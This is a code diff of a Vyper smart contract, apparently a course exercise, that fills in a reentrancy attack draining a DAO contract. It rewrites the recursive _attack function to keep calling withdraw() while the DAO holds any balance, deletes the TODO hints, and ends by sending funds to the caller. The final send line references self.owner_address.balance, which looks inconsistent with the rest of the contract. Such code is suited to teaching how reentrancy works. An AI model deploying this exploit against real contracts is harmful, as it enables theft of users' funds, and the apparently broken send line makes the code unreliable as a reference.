@@ -16,14 +16,12 @@ def __init__():
 @internal
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
-    if self.count > 0:
+    if self.dao_address.balance > 0:
         DAO(self.dao_address).withdraw()
-        self.count -= 1
         return True
     else:
         return False
-    # TODO: Use the DAO interface to withdraw funds.
-    # Make sure you add a "base case" to end the recursion
+
     return True
 
 @external
@@ -38,14 +36,12 @@ def attack(dao_address:address):
     
     # TODO: make the deposit into the DAO   
     
-    self.count = dao_address.balance/deposit_amount
+  
     self.dao_contract = DAO(self.dao_address)
     # TODO: Start the reentrancy attack
     self.dao_contract.deposit()
     self.dao_contract.withdraw()
-    send(msg.sender, self.dao_address.balance)
-
-    # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
+    send(msg.sender, self.owner_address.balance)
     
 
 @external
